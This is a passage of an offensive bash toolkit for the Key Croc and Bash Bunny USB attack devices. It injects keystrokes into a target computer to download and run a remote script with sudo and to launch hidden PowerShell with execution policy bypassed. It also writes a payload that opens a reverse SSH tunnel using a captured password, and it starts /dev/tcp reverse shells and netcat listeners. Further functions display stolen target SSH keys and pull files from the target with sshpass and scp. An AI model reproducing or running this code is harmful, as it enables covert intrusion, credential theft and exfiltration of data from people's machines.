			QUACK ENTER ; QUACK STRING "echo \"bb.sh is installed\"" ; QUACK ENTER ; QUACK STRING "else" ; QUACK ENTER ; QUACK STRING "echo \"installing bb.sh\"" ; QUACK ENTER
			QUACK STRING "wget bashbunny.com/bb.sh" ; QUACK ENTER ; QUACK STRING "fi" ; QUACK ENTER ; sleep 2 ; QUACK STRING "sudo bash ./bb.sh" ; QUACK ENTER ; sleep 3
			QUACK STRING "c" ; sleep 2 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB ;;
		*)
			QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1 ; QUACK STRING "i=\$(whoami)" ; QUACK ENTER ; QUACK STRING "if [ -e /home/\${i}/bb.sh ]; then"
			QUACK ENTER ; QUACK STRING "echo \"bb.sh is installed\"" ; QUACK ENTER ; QUACK STRING "else" ; QUACK ENTER ; QUACK STRING "echo \"installing bb.sh\"" ; QUACK ENTER
			QUACK STRING "wget bashbunny.com/bb.sh" ; QUACK ENTER ; QUACK STRING "fi" ; QUACK ENTER ; sleep 2 ; QUACK STRING "sudo bash ./bb.sh" ; QUACK ENTER ; sleep 3
			QUACK STRING "c" ; sleep 2 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB ;;
		esac ;;
	[nN] | [nN][oO])
		ColorYellow 'Maybe next time\n' ;;
	*)
		invalid_entry ;;
	esac
fi
##
#----bunny create reverse ssh payload for bash bunny save to tools/Bunny_Payload_Shell
##
	for dir in "$bunny_payload"; do [[ ! -d "$dir" ]] && mkdir "$dir" || LED B; done
		if [ -e "$bunny_payload_v" ]; then
			cat "$bunny_payload_v" ; echo -ne "\n$LINE\n"
			ColorGreen 'Reverse shell payload already exists check tools/Bunny_Payload_Shell folder\n'
			read_all 'KEEP THIS SETUP Y/N AND PRESS [ENTER]'
				case "$r_a" in
					[yY] | [yY][eE][sS])
						ColorGreen 'Keeping existing Bunny_Payload_Shell\n' ;;
					[nN] | [nN][oO])
						rm "$bunny_payload_v"
						echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc, check for sshpass\n# Author:        Spywill\n# Version:       1.1
# Category:      Bash Bunny\n#\n#ATTACKMODE HID RNDIS_ETHERNET\n#ATTACKMODE HID ECM_ETHERNET\nATTACKMODE HID AUTO_ETHERNET\nsleep 30\nLED SETUP\nGET TARGET_HOSTNAME && echo \"\$TARGET_HOSTNAME\" > /tmp/OS.txt\n\nGET TARGET_OS && echo \"\$TARGET_OS\" >> /tmp/OS.txt\nLED B\nsleep 1
until wget -q --spider http://google.com; do\n	LED R\n	sleep 1\ndone\nLED G\nstatus=\"\$(dpkg-query -W --showformat='\${db:Status-Status}' sshpass 2>&1)\"\nif [ ! \$? = 0 ] || [ ! \"\$status\" = installed ]; then\n	LED SETUP\n	apt -y install sshpass\n	LED G\nelse\n	LED G\nfi
until sshpass -p $(sed -n 1p /tmp/CPW.txt) ssh -fN -R 7001:localhost:22 -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-) 2>/dev/null; do\n	LED R\n	sleep 1\ndone\nLED ATTACK" | tee $bunny_payload_v
						cat "$bunny_payload_v" ; echo -ne "\n$LINE\n"
						ColorGreen 'Bunny Reverse Tunnel payload is created check tools/Bunny_Payload_Shell folder\n' ;;
					*)
						invalid_entry ;;
				esac
		else
			echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc, check for sshpass\n# Author:        Spywill\n# Version:       1.1
# Category:      Bash Bunny\n#\n#ATTACKMODE HID RNDIS_ETHERNET\n#ATTACKMODE HID ECM_ETHERNET\nATTACKMODE HID AUTO_ETHERNET\nsleep 30\nLED SETUP\nGET TARGET_HOSTNAME && echo \"\$TARGET_HOSTNAME\" > /tmp/OS.txt\n\nGET TARGET_OS && echo \"\$TARGET_OS\" >> /tmp/OS.txt\nLED B\nsleep 1
until wget -q --spider http://google.com; do\n	LED R\n	sleep 1\ndone\nLED G\nstatus=\"\$(dpkg-query -W --showformat='\${db:Status-Status}' sshpass 2>&1)\"\nif [ ! \$? = 0 ] || [ ! \"\$status\" = installed ]; then\n	LED SETUP\n	apt -y install sshpass\n	LED G\nelse\n	LED G\nfi
until sshpass -p $(sed -n 1p /tmp/CPW.txt) ssh -fN -R 7001:localhost:22 -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-) 2>/dev/null; do\n	LED R\n	sleep 1\ndone\nLED ATTACK" | tee $bunny_payload_v
			ColorGreen 'Bunny Reverse shell payload is created check tools/Bunny_Payload_Shell folder\n'
		fi
##
#----bunny start ssh session with target to bash bunny
##
	read_all 'START SSH WITH TARGET TO BUNNY Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			read_all 'ENTER BASH BUNNY PASSWORD AND PRESS [ENTER]'
			if [ "$(OS_CHECK)" = WINDOWS ]; then
				QUACK GUI d ; QUACK GUI r ; sleep 1 ; QUACK STRING "powershell" ; QUACK ENTER ; sleep 2 ; QUACK STRING "ssh root@172.16.64.1" ; QUACK ENTER ; sleep 2 ; QUACK STRING "$r_a" ; QUACK ENTER
			else
				case "$HOST_CHECK" in
					raspberrypi)
						QUACK CONTROL-ALT-t ; sleep 1 ; QUACK STRING "ssh root@172.16.64.1" ; QUACK ENTER ; sleep 2 ; QUACK STRING "$r_a" ; QUACK ENTER ;;
					"$HOST_CHECK")
						QUACK ALT-t ; QUACK ENTER ; sleep 1 ; QUACK STRING "ssh root@172.16.64.1" ; QUACK ENTER ; sleep 2 ; QUACK STRING "$r_a" ; QUACK ENTER ;;
					*)
						QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1 ; QUACK STRING "ssh root@172.16.64.1" ; QUACK ENTER ; sleep 2 ; QUACK STRING "$r_a" ; QUACK ENTER ;;
				esac
			fi ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
##
#----bunny start reverse shell bunny to keycroc
##
	read_all 'START REVERSE TUNNEL WITH BUNNY TO CROC Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			if [[ $(ssh -o "StrictHostKeyChecking no" -o ConnectTimeout=5 root@localhost -p 7001 'echo ok' | sed 's/\r//g') = "ok" ]]; then
				LED ATTACK
				ssh -o "StrictHostKeyChecking no" root@localhost -p 7001 'echo -ne "BASH BUNNY OS DETECTION: $(sed -n 2p /tmp/OS.txt)\nTARGET HOSTNAME: $(sed -n 1p /tmp/OS.txt)\n"'
				ssh root@localhost -p 7001
			else
				ColorRed 'Failed to make connection\n'
			fi ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----SSH Create and view public/private keys and copy to remote-host
##
ssh_keygen() {
	Info_Screen 'Perform SSH Login Without Password Using ssh-keygen & ssh-copy-id

[G]-Generate public/private keys using ssh-key-gen on local-host
[S]-Send keys to remote-host using ssh-copy-id
[V]-View target/keycroc public/private and known_hosts keys
[R]-Correct host key in /root/.ssh/known_hosts
[N]-Return back to menu

Example: ssh-copy-id -i ~/.ssh/id_rsa.pub username@remote-host-ip
-remote-host can be pineapple,server,pc,etc'
	read_all '[G]-GENERATE [S]-SEND [V]-VIEW [R]-REMOVE [N]-NONE PRESS'
	case "$r_a" in
	[gG])
		ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa
		read_all 'SEND KEYS TO REMOTE-HOST Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				read_all 'ENTER USER-NAME@REMOTE-HOST-IP AND PRESS [ENTER]'
				ssh-copy-id -i ~/.ssh/id_rsa.pub "$r_a" ;;
			[nN] | [nN][oO])
				ColorYellow 'Maybe next time' ;;
			*)
				invalid_entry ;;
		esac ;;
	[sS])
		if [ -f /root/.ssh/*.pub ]; then
			read_all 'ENTER USER-NAME@REMOTE-HOST-IP AND PRESS [ENTER]'
			ssh-copy-id -i ~/.ssh/id_rsa.pub "$r_a"
		else
			ColorYellow 'Need to Generate public/private keys first\n'
			ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa
			read_all 'ENTER USER-NAME@REMOTE-HOST-IP AND PRESS [ENTER]'
			ssh-copy-id -i ~/.ssh/id_rsa.pub "$r_a"
		fi ;;
	[rR])
		read_all 'REMOVE SSH_KEYGEN HOST KEY Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				read_all 'ENTER THE IP FOR SSH_KEYGEN REMOVAL AND PRESS [ENTER]'
				ssh-keygen -f "/root/.ssh/known_hosts" -R "$r_a" ;;
			[nN] | [nN][oO])
				ColorYellow 'Did not make any changes\n' ;;
			*)
				invalid_entry ;;
		esac ;;
	[vV])
##
#----SSH view target public/private and known_hosts keys
##
		printf '\033[H\033[2J'
		if [ -f "$(find /root/udisk/loot/Croc_Pot/SSH -type f -name "*.pub")" ]; then
			ColorYellow 'Target public Keys:\n'
			cat "$(find /root/udisk/loot/Croc_Pot/SSH -type f -name "*.pub")"
		else
			ColorRed 'Unable to locate Target public/private Keys Run Croc_Pot_Payload.txt retrieve target public/private keys\n'
		fi
		ssh_f="$(find /root/udisk/loot/Croc_Pot/SSH -type f -name "*.pub" | sed 's/\.[^.]*$//')"
		if [ -f "$ssh_f" ]; then
			ColorYellow 'Target private Keys:\n'
			cat "$ssh_f"
		fi
		if [ -f "/root/udisk/loot/Croc_Pot/SSH/known_hosts" ]; then
			ColorYellow 'Target known_hosts Keys:\n' ; cat /root/udisk/loot/Croc_Pot/SSH/known_hosts
		fi
##
#----SSH view keycroc public/private and known_hosts keys
##
		sleep 2
		printf '\033[H\033[2J'
		if [ -f "$(find /root/.ssh -type f -name "*.pub")" ]; then
			ColorYellow 'Keycroc public Keys:\n'
			cat "$(find /root/.ssh -type f -name "*.pub")"
		else
			ColorRed "Unable to locate Keycroc public/private Keys Run [G]-Generate Create public/private keys\n"
		fi
		ssh_f="$(find /root/.ssh -type f -name "*.pub" | sed 's/\.[^.]*$//')"
		if [ -f "$ssh_f" ]; then
			ColorYellow 'Keycroc private Keys:\n'
			cat "$ssh_f"
		fi
		if [ -f "/root/.ssh/known_hosts" ]; then
			ColorYellow 'Keycroc known_hosts Keys:\n'
			cat /root/.ssh/known_hosts
		fi ; sleep 2 ;;
	[nN] | [nN][oO])
		ColorYellow 'Maybe next time\n' ;;
	*)
		invalid_entry ;;
	esac
}
##
#----SSH reverse shell user input
##
croc_reverse_shell() {
	Info_Screen '# 1 Start reverse shell with nc start listening on remote-server first
# 2 Start listening on the keycroc
# 3 Start reverse ssh tunnel target to KeyCroc
# 4 Start reverse ssh tunnel Keycroc to remote-server
# 5 Send remote commands with ssh
# 6 Send remote files with SCP'
shell_input() {
	unset IP_RS IP_RSP IP_RSN
	rm /root/udisk/tools/Croc_Pot/saved_shell.txt 2>/dev/null
	read_all 'ENTER IP OF SERVER/REMOTE-HOST PRESS [ENTER]' ; IP_RS="$r_a" ; echo "$IP_RS" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
	read_all 'ENTER PORT NUMBER TO USE PRESS [ENTER]' ; IP_RSP="$r_a" ; echo "$IP_RSP" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
	read_all 'ENTER SERVER/REMOTE-HOST NAME PRESS [ENTER]' ; IP_RSN="$r_a" ; echo "$IP_RSN" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
}
##
#----SSH reverse with netcat remote listener on (server)
##
remote_listener() {
	Info_Screen '-Start a reverse shell with netcat on keycroc
-Remotely access keycroc from a remote-server
-First On the listening remote-server enter this below
-->nc -lnvp PORT# -s IP OF LISTENING REMOTE-SERVER
-On Keycroc Enter ip of the listening remote-server and port number
-Keycroc side will be setup as below
-->/bin/bash -i >& /dev/tcp/remote-server-ip/port#'
	read_all 'START REVERSE SHELL Y/N AND PRESS [ENTER]'
	case "$r_a" in
	[yY] | [yY][eE][sS])
		local SAVE_SHELL=/root/udisk/tools/Croc_Pot/saved_shell.txt
		if [ -e "$SAVE_SHELL" ]; then
			echo -ne "\n$(sed -n 1p "$SAVE_SHELL") Server IP\n$(sed -n 3p "$SAVE_SHELL") Server user name\n$(sed -n 2p "$SAVE_SHELL") Server Port\n"
			read_all 'SAVED SHELL USE THEM Y/N AND PRESS [ENTER]'
			case "$r_a" in
				[yY] | [yY][eE][sS])
					ColorYellow "LISTENING SERVER SETUP $(ColorGreen "nc -lnvp $(sed -n 2p $SAVE_SHELL) -s $(sed -n 1p $SAVE_SHELL)")\n"
					/bin/bash -i >& /dev/tcp/"$(sed -n 1p "$SAVE_SHELL")"/"$(sed -n 2p "$SAVE_SHELL")" 0>&1 & ;;
				[nN] | [nN][oO])
					shell_input
					ColorYellow "LISTENING SERVER SETUP $(ColorGreen "nc -lnvp $IP_RSP -s $IP_RS")\n"
					/bin/bash -i >& /dev/tcp/"$IP_RS"/"$IP_RSP" 0>&1 & ;;
				*)
					invalid_entry ;;
			esac
		else
			ColorRed 'Did not find any saved shell setup\n'
			shell_input
			ColorYellow "LISTENING SERVER SETUP $(ColorGreen "nc -lnvp $IP_RSP -s $IP_RS")\n"
			/bin/bash -i >& /dev/tcp/"$IP_RS"/"$IP_RSP" 0>&1 &
		fi ;;
	[nN] | [nN][oO])
		ColorYellow 'Maybe next time\n' ;;
	*)
		invalid_entry ;;
	esac
}
##
#----SSH keycroc as listener
##
croc_listener() {
	Info_Screen '-Start Listening on keycroc
-Access on remote PC,server
-This will start listening on the keycroc
-Enter this below on remote-server/host side
-/bin/bash -i >& /dev/tcp/IP/7000 0>&1 &'
	read_all 'START LISTENING ON CROC Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			ColorYellow "ON REMOTE PC/SERVER SETUP $(ColorGreen "/bin/bash -i >& /dev/tcp/$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)/7000 0>&1")\n"
			nc -lnvp 7000 -s "$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)" ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----SSH reverse ssh tunnle with target to keycroc
##
shell_pc() {
	Info_Screen '-Start reverse ssh tunnel Target to Keycroc
-PC side will be setup with this below
-->ssh -fN -R port#:localhost:22 root@keycroc IP
-Keycroc side will be setup with this below
-->ssh PC-username@localhost -p port#'
	ColorYellow "Found save Passwd try this: $(target_pw)\n"
start_shell() {
	if [ -f "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
		sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"@localhost -p "$r_a"
	else
		ssh -o "StrictHostKeyChecking no" "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"@localhost -p "$r_a"
	fi
}
if [ -f "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
	read_all 'START REVERSE SSH TUNNEL TARGET TO KEYCROC Y/N AND PRESS [ENTER]'
	case "$r_a" in
	[yY] | [yY][eE][sS])
		read_all 'ENTER PORT NUMBER TO BE USE AND PRESS [ENTER]'
		if [ "$(OS_CHECK)" = WINDOWS ]; then
			QUACK GUI d ; QUACK GUI r ; sleep 1 ; QUACK STRING "powershell -NoP -NonI -W Hidden -Exec Bypass" ; QUACK ENTER ; sleep 3
			QUACK STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
			QUACK ENTER ; sleep 3 ; QUACK STRING "$(sed -n 1p /tmp/CPW.txt)" ; QUACK ENTER ; sleep 2 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB ; start_shell
		else
			case "$HOST_CHECK" in
			raspberrypi)
				QUACK CONTROL-ALT-t ; sleep 1
				QUACK STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
				QUACK ENTER ; sleep 2 ; QUACK STRING "$(sed -n 1p /tmp/CPW.txt)" ; QUACK ENTER ; sleep 1 ; QUACK STRING "exit" ; QUACK ENTER ; sleep 1 ; QUACK ALT-TAB ; start_shell ;;
			"$HOST_CHECK")
				QUACK ALT-t ; QUACK ENTER ; sleep 1
				QUACK STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
				QUACK ENTER ; sleep 2 ; QUACK STRING "$(sed -n 1p /tmp/CPW.txt)" ; QUACK ENTER ; sleep 1 ; QUACK STRING "exit" ; QUACK ENTER ; sleep 1 ; QUACK ALT-TAB ; start_shell ;;
			*)
				QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1
				QUACK STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
				QUACK ENTER ; sleep 2 ; QUACK STRING "$(sed -n 1p /tmp/CPW.txt)" ; QUACK ENTER ; sleep 1 ; QUACK STRING "exit" ; QUACK ENTER ; sleep 1 ; QUACK ALT-TAB ; start_shell ;;
			esac
		fi ;;
	[nN] | [nN][oO])
		ColorYellow 'Maybe next time\n' ;;
	*)
		invalid_entry ;;
	esac
else
	ColorYellow 'PLEASE RUN CROC_POT_PAYLOAD.TXT TO GET TARGET IP/USERNAME\n'
fi
}
##
#----SSH start a Reverse SSH Tunnel Keycroc to virtual private server (VPS)
##
ssh_tunnel() {
	local SAVE_SHELL=/root/udisk/tools/Croc_Pot/saved_shell.txt
	Info_Screen '-Start a Reverse SSH Tunnel Keycroc to virtual private server (VPS)
-Remotely access keycroc from VPS or SSH to VPS
-Keycroc will be setup with these setting below:
-ssh -fN -R port#:localhost:22 root@remote-server-ip
-ON VPS side enter this below:
-ssh root@localhost -p port#'
	start_tunnel() {
		ping -q -c 1 -w 1 "$(sed -n 1p "$SAVE_SHELL")" &>/dev/null 2>&1
	if [[ $? -ne 0 ]]; then
		ColorRed "Unable to reach VPS $(sed -n 1p "$SAVE_SHELL")\n"
	elif [[ "${#args[@]}" -eq 0 ]]; then
		ColorYellow "Keycroc SETUP $(ColorGreen "ssh -fN -R $(sed -n 2p "$SAVE_SHELL"):localhost:22 $(sed -n 3p "$SAVE_SHELL")@$(sed -n 1p "$SAVE_SHELL")")\n"
		ColorYellow "VPS SETUP $(ColorGreen "ssh root@localhost -p $(sed -n 2p "$SAVE_SHELL")")\n"
		ssh -fN -R "$(sed -n 2p "$SAVE_SHELL")":localhost:22 "$(sed -n 3p "$SAVE_SHELL")"@"$(sed -n 1p "$SAVE_SHELL")"
	fi
	}
##
#----Start SSH session with vps
##
	ssh_vps() {
		ping -q -c 1 -w 1 "$(sed -n 1p "$SAVE_SHELL")" &>/dev/null 2>&1
		if [[ $? -ne 0 ]]; then
			ColorRed "Unable to start ssh on VPS $(sed -n 1p "$SAVE_SHELL")\n"
		elif [[ "${#args[@]}" -eq 0 ]]; then
			sshpass -p "$(sed -n 4p "$SAVE_SHELL")" ssh -o "StrictHostKeyChecking no" "$(sed -n 3p "$SAVE_SHELL")"@"$(sed -n 1p "$SAVE_SHELL")"
		fi
	}
	vps_info() {
		sshpass -p "$(sed -n 4p "$SAVE_SHELL")" ssh -o "StrictHostKeyChecking no" "$(sed -n 3p "$SAVE_SHELL")"@"$(sed -n 1p "$SAVE_SHELL")" "uptime ; echo $LINE ; uname --all ; echo $LINE ; cat /proc/version ; echo $LINE ; ifconfig ; echo $LINE ; last -a | head -3 ; echo $LINE ; service --status-all ; echo $LINE"
		sshpass -p "$(sed -n 4p "$SAVE_SHELL")" ssh -o "StrictHostKeyChecking no" "$(sed -n 3p "$SAVE_SHELL")"@"$(sed -n 1p "$SAVE_SHELL")" 'ps -aux'
	}
	vps_command() {
		read_all 'ENTER COMMAND AND PRESS [ENTER]' ; local USER_COMMAND="$r_a"
		sshpass -p "$(sed -n 4p "$SAVE_SHELL")" ssh -o "StrictHostKeyChecking no" "$(sed -n 3p "$SAVE_SHELL")"@"$(sed -n 1p "$SAVE_SHELL")" "$USER_COMMAND"
	}
##
#----SSH reverse ssh tunnel keycroc to VPS (payload)
##
	reverse_payload() {
		Info_Screen '-Create Reverse SSH Tunnel Payload keycroc to remote-server
-Plug keycroc into Target and type in croctunnel
-Keycroc side will be setup as below
-->ssh -fN -R port#:localhost:22 username@remote-server-ip
-Enter on remote-server side as below
-->ssh root@localhost -p port#'
	local PAYLOAD_SHELL=/root/udisk/payloads/Croc_Shell.txt
	if [ -f "$PAYLOAD_SHELL" ]; then
		ColorGreen 'Croc_Shell already exists\n'
		cat "$PAYLOAD_SHELL"
		echo -ne "\n$LINE\n"
		read_all 'KEEP THIS SETUP Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				ColorGreen 'Keeping existing Croc_Shell Payload\n' ;;
			[nN] | [nN][oO])
				rm "$PAYLOAD_SHELL"
				shell_input
				echo -ne "# Title:         Croc_ssh_Tunnel\n# Description:   Create a Reverse SSH Tunnel with keycroc to remote server
# Author:        spywill\n# Version:       1.0\n# Category:      Key Croc
#\nMATCH croctunnel\n#\nssh -fN -R ${IP_RSP}:localhost:22 ${IP_RSN}@${IP_RS}\nLED ATTACK" > "$PAYLOAD_SHELL"
				ColorGreen 'Croc_shell PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER\n'
				cat "$PAYLOAD_SHELL" ;;
			*)
				invalid_entry ;;
		esac
	else
		ColorRed 'Did not find Croc_Shell Payload\n'
		shell_input
		echo -ne "# Title:         Croc_ssh_Tunnel\n# Description:   Create a Reverse SSH Tunnel with keycroc to remote server
# Author:        spywill\n# Version:       1.0\n# Category:      Key Croc
#\nMATCH croctunnel\n#\nssh -fN -R ${IP_RSP}:localhost:22 ${IP_RSN}@${IP_RS}\nLED ATTACK" > "$PAYLOAD_SHELL"
		ColorGreen 'Croc_shell PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER\n'
	fi
	}
	if [ -e "$SAVE_SHELL" ]; then
		ColorYellow "VPS IP: $(ColorGreen "$(sed -n 1p $SAVE_SHELL)")\n"
		ColorYellow "VPS username: $(ColorGreen "$(sed -n 3p $SAVE_SHELL)")\n"
		ColorYellow "VPS Port: $(ColorGreen "$(sed -n 2p $SAVE_SHELL)")\n"
		read_all 'EXISTING VPS SETUP KEEP THEM Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				ColorYellow 'KEEPING EXISTING VPS SETUP\n'
				ping -q -c 1 -w 1 "$(sed -n 1p $SAVE_SHELL)" &>/dev/null 2>&1
				if [[ $? -ne 0 ]]; then
					ColorRed "Unable to reach VPS $(sed -n 1p "$SAVE_SHELL")\n"
					ssh_tunnel
				elif [[ "${#args[@]}" -eq 0 ]]; then
##
#----VPS Menu
##
					MenuTitle 'REMOTE VPS MENU'
					MenuColor 24 1 'START REVERSE SSH TUNNEL'
					MenuColor 24 2 'CHECK VPS STATUS'
					MenuColor 24 3 'START SSH TO VPS'
					MenuColor 24 4 'REMOTE COMMAND TO VPS'
					MenuColor 24 5 'REVERSE TUNNEL PAYLOAD'
					MenuColor 24 6 'RETURN TO MAIN MENU'
					MenuEnd 23
					case "$m_a" in
						1) start_tunnel ; ssh_tunnel ;;
						2) vps_info ; ssh_tunnel ;;
						3) ssh_vps ; ssh_tunnel ;;
						4) vps_command ; ssh_tunnel ;;
						5) reverse_payload ; ssh_tunnel ;;
						6) main_menu ;;
						0) exit ;;
						lock) Lock_keyboard ; ssh_tunnel ;;
						[pP]) Panic_button ;; [bB]) croc_reverse_shell ;; *) invalid_entry ; ssh_tunnel ;;
					esac
				fi ;;
			[nN] | [nN][oO])
				rm "$SAVE_SHELL"
				shell_input ; user_input_passwd "$SAVE_SHELL" VPS ; ssh_tunnel ;;
			*)
				invalid_entry ; ssh_tunnel ;;
		esac
	else
		ColorRed 'Did not find any saved remote-server VPS shell setup\n'
		shell_input ; user_input_passwd "$SAVE_SHELL" VPS ; ssh_tunnel
	fi
}
##
#----SSH Copy a Local File to a Remote System with the scp Command
##
remote_file() {
	local TARGET_USERNAME="$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"
	Info_Screen '-Copy a Local File to a Remote System with the scp Command
-Example:
-scp path/to/local/file.ext remote_username@remote_IP:path/to/remote/file.ext
-Copy a Remote File to a Local System using the scp Command
-Example:
-scp remote_username@remote_IP:path/to/remote/file.ext path/to/local/file.ext'
##
#----SSH send Remote File keycroc to target
##
keycroc_target() {
	Info_Screen '-Send file from keycroc to target
-Save to target home'
	for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do
		count=$(find "/$dir" -type f 2>/dev/null | wc -l)
		if [ $? -eq 0 ]; then
			ColorYellow "Directory:$(ColorCyan " /$dir ")$(ColorYellow 'Contains:')$(ColorGreen " $count ")$(ColorYellow 'files.')\n"
		fi
	done
	read_all 'ENTER THE DIRECTORY NAME TO VIEW FILES AND PRESS [ENTER]' ; local r_f="$r_a"
	f="$(find /"$r_f" -type f -name "*")" ; ColorGreen "$f\n"
	read_all 'ENTER THE FULL PATH OF FILE TO SEND AND PRESS [ENTER]'
	if [ -e "$r_a" ]; then
		if [ "$(OS_CHECK)" = WINDOWS ]; then
			sshpass -p "$(target_pw)" scp -o "StrictHostKeyChecking no" "$r_a" "$TARGET_USERNAME"@"$(os_ip)":/C:/
		elif [ "$(OS_CHECK)" = LINUX ]; then
			sshpass -p "$(target_pw)" scp -o "StrictHostKeyChecking no" "$r_a" "$TARGET_USERNAME"@"$(os_ip)":~/
		fi
	else
		ColorRed 'File does not exist\n' ; invalid_entry
	fi
}
##
#----SSH Receive Remote File target to keycroc
##
target_keycroc() {
	Info_Screen '-Receive file from target to keycroc
-Save to keycroc loot/Croc_Pot
-Will need to know the path of file on target'
	if [ "$(OS_CHECK)" = WINDOWS ]; then
		sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'powershell -Command "& {Get-ChildItem -Recurse | ?{ $_.PSIsContainer } | Select-Object FullName, ` @{Name=\"FileCount\";Expression={(Get-ChildItem $_ -File | Measure-Object).Count }}}"' 2>/dev/null
		read_all 'ENTER THE DIRECTORY NAME TO VIEW FILES AND PRESS [ENTER]' ; local r_f="$r_a"
		sshpass -p "$(target_pw)" ssh "$TARGET_USERNAME"@"$(os_ip)" 'powershell -Command "& {Get-ChildItem -Path '"$r_f"' | Select-Object FullName}"'
		read_all 'ENTER THE FULL PATH OF FILE TO RECEIVE AND PRESS [ENTER]'
		sshpass -p "$(target_pw)" ssh "$TARGET_USERNAME"@"$(os_ip)" 'test -e "$r_a"'
		if [ $? -eq 0 ]; then
			sshpass -p "$(target_pw)" scp "$TARGET_USERNAME"@"$(os_ip)":"$r_a" /root/udisk/loot/Croc_Pot
		else
			ColorRed 'File does not exist\n' ; invalid_entry
		fi
	elif [ "$(OS_CHECK)" = LINUX ]; then
		sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do count=$(find "/$dir" 2>/dev/null | wc -l); if [ $? -eq 0 ]; then printf "'"$yellow"'Directory: '"$cyan"'/%s'"$yellow"' Contains: '"$green"'%s'"$yellow"' files.\n'"$clear"' " "$dir" "$count"; fi; done'
		read_all 'ENTER THE DIRECTORY NAME TO VIEW FILES AND PRESS [ENTER]' ; local r_f="$r_a"
		sshpass -p "$(target_pw)" ssh "$TARGET_USERNAME"@"$(os_ip)" 'f=`sudo find /'"$r_f"' -type f -name "*.*"` ; echo -ne "'"$green"'$f'"$clear"'\n"'
		read_all 'ENTER THE FULL PATH OF FILE TO RECEIVE AND PRESS [ENTER]'
		sshpass -p "$(target_pw)" ssh "$TARGET_USERNAME"@"$(os_ip)" 'test -e "$r_a"'
		if [ $? -eq 0 ]; then
			sshpass -p "$(target_pw)" scp "$TARGET_USERNAME"@"$(os_ip)":"$r_a" /root/udisk/loot/Croc_Pot
		else
			ColorRed 'File does not exist\n' ; invalid_entry
		fi
	fi
}
##
#----SSH send Remote File by enter target credentials host_name/host_ip
##
user_file() {
	Info_Screen '-Send file from keycroc to remote host
-Save to remote host home'
	read_all 'ENTER REMOTE HOST IP AND PRESS [ENTER]' ; local r_h="$r_a"
	if [[ "$r_h" =~ $validate_ip ]]; then
		ping -q -c 1 -w 1 "$r_h" &>/dev/null 2>&1
		if [[ $? -ne 0 ]]; then
			ColorRed 'Unable to reach host\n'
		elif [[ "${#args[@]}" -eq 0 ]]; then
			for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do
				count=$(find "/$dir" -type f 2>/dev/null | wc -l)
				if [ $? -eq 0 ]; then
					ColorYellow "Directory:$(ColorCyan " /$dir ")$(ColorYellow 'Contains:')$(ColorGreen " $count ")$(ColorYellow 'files.')\n"
				fi
			done
			read_all 'ENTER THE DIRECTORY NAME TO VIEW FILES AND PRESS [ENTER]' ; local r_f="$r_a"
			f="$(find /"$r_f" -type f -name "*")" ; ColorGreen "$f\n"
